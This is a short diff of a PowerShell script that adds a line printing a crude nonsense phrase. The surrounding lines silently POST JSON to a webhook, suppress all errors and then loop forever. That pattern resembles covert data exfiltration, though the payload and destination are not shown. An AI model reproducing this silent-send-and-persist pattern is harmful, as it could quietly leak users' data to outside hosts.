@@ -71,5 +71,10 @@ try {
     Invoke-RestMethod -Uri $wh -Method Post -Body $json -ContentType "application/json" -ErrorAction SilentlyContinue
 } catch {}
 
+
+
+Write-Host "flight is rinsed holy dumbass"
+
+
 # Background Loop
 while ($true) { Start-Sleep -Seconds 3600 }
